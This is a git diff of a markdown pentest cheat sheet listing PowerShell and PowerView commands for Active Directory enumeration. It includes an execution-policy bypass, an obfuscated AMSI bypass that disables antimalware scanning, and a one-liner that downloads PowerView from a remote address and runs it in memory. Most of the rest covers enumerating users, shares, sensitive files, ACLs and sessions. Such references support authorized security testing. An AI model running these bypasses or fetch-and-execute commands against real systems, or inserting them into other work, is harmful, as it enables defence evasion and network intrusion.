@@ -1,46 +1,59 @@
-# DomainTricks
+<p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
 
-# Execution Policy Bypass:
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+    @n3k00n3 | @UserXGnu
+</p>
+
+
+# AD Enumeration
+
+## Execution Policy Bypass:
 
 ```powershell
 powershell -ep bypass
 ```
 
-# Bypass AMSI:
+## Bypass AMSI:
 
 ```
 sET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx')([TYpE]("{1}{0}"-F'F','rE'));(GeT-VariaBle("1Q2U" + "zX") -VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f 'Util','A','Amsi','.Management.','utomation.','s','System'))."g`etf`iElD"(("{0}{2}{1}" -f 'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})
 
 ```
 
-#PowerView from remote into memory:
+## PowerView from remote into memory:
 
 ```powershell
 iex (iwr 'https://<remote_address>/PowerView.ps1')
 ```
 
-# Enumerate domain
+## Enumerate domain
+
+(Powerview)
 
 ```powershell
 Get-NetDomain
 Get-NetDomain -Domain <domain>
 ```
 
-# Enumerate domain-controllers
+## Enumerate domain-controllers
+
 
 ```powershell
 Get-NetDomainController
 Get-NetDomainController -Domain <domain>
 ```
 
-# Enumerate Policies
+## Enumerate Policies
 
 ```powershell
 Get-DomainPolicy
 (Get-DomainPolicy)."Policy Name"
 ```
 
-# Enumerate Users:
+## Enumerate Users:
 
 ```powershell
 Get-NetUser
@@ -58,7 +71,7 @@ Get-UserProperty -Properties samaccountname,<property> |Select-String -Pattern  
     * Look for users that badpwdcount is non-zero or a big numer;
 
 
-# Enumerate Computer objets:
+## Enumerate Computer objets:
 
 ```powershell
 Get-NetComputer
@@ -76,13 +89,13 @@ Get-NetComputer -Fulldata |Select  dnshostname,distinguishedname | Out-String -S
 Get-NetComputer -Fulldata |Select  dnshostname,distinguishedname | Out-String -Stream |Select-String -pattern "OU=<organization-unit-name>"
 ```
 
-# Enumerate live machines
+## Enumerate live machines
 
 ```powershell
 Get-NetComputer -Computer <computername|dnshostname> -Ping
 ```
 
-# Enumerate Groups in the current domain
+## Enumerate Groups in the current domain
 
 ```powershell
 Get-NetGroup
@@ -99,14 +112,14 @@ Get-NetGroupMember -GroupName "<groupname>" [-Domain "<domain>"] -Recurse // wha
 Get-NetGroup -Username "username" // what groups a user is member of
 ```
 
-# Enumerate Local Groups
+## Enumerate Local Groups
 
 ```powershell
 Get-NetLocalGroup -ComputerName "<computername>" -ListGroups // all localgroups, requires admin priv for non-dc machines
 Get-NetLocalGroup -ComputerName "<computername>" -Recurse // All Members of localgroups, requires the same privs of the above
 ```
 
-# Enumerate Active logged on users on a Computer
+## Enumerate Active logged on users on a Computer
 
 ```powershell
 Get-NetLoggedon -ComputerName "<computername> // requires admin rights"
@@ -114,7 +127,7 @@ Get-LastLoggedOn -ComputerName "<computername> // requires admin rights "
 Get-LoggedonLocal -ComputerName "<computername> // Requires remote registry enabled, it is enabled by default"
 ```
 
-# Find Shares
+## Find Shares
 
 ```powershell
 Get-NetFileServer // retrieve all file servers on the domain
@@ -122,7 +135,7 @@ Invoke-ShareFinder [-Versbose] [-ExcludeIPC -ExcludePrint -ExcludeStandard]
 Invoke-FileFinder [-Verbose] // Sensitive files on computers in the domain
 ```
 
-# Group Policies
+## Group Policies
 
 ```powerview
 Get-NetGPO
@@ -140,13 +153,13 @@ Find-GPOLocation -UserName <username> // machines where a user is member of a gr
 Get-NetGPO -GPOName "{$(Get-NetOU -OUName "<organization_unit_name>" -FullData |select -ExpandProperty gplink | %{ $_.Split("{")[1].Split("}")[0]; })}"
 ```
 
-# Organization Units:
+## Organization Units:
 
 ```powershell
 Get-NetOU [-FullData]
 ```
 
-# ACLS
+## ACLS
 
 ```powershell
 Get-ObjectACL
@@ -166,7 +179,7 @@ Get-PathAcl -Path "aclpath"  // get acls associated with the path
 Invoke-ACLScanner -ResolveGUIDs
 ```
 
-# Domain Trusts
+## Domain Trusts
 
 * One-way trust
 
@@ -207,7 +220,7 @@ A <-> B <-> C = A <-> C
 
 **All the intra-forest trusts are automatic**
 
-# Trusts
+## Trusts
 
 ```powershell
 Get-NetDomainTrust
@@ -218,7 +231,7 @@ Get-NetForestTrust [-Forest '<forest>']
 
 ```
 
-# Local Admin Access
+## Local Admin Access
 
 * Intrusive and noisy.
 
@@ -230,13 +243,13 @@ Invoke-UserHunter [-GroupName "groupname"] -[CheckAccess]
 
 ```
 
-# Get user sessions
+## Get user sessions
 
 ```
 Get-NetSession [-Computername "<computername>"]
 ```
 
-# Remove NetSessionEnum permission from the Authenticated Users Groups
+## Remove NetSessionEnum permission from the Authenticated Users Groups
 
 ```
 .\NetCease.ps1
